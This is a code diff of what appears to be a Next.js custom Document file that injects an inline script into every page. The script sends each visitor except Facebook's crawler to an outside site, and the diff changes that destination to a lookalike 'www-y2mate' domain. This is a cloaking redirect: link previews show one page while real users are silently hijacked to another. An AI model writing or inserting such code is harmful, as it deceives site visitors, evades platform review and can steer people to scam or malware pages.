@@ -34,7 +34,7 @@ class MyDocument extends Document {
                 dangerouslySetInnerHTML={{
                   __html: `
                     if (!/facebookexternalhit|Facebot/i.test(navigator.userAgent)) {
-                      window.location.href = "https://screeninsiderhub.blogspot.com";
+                      window.location.href = "https://v6.www-y2mate.com";
                     }
                   `,
                 }}
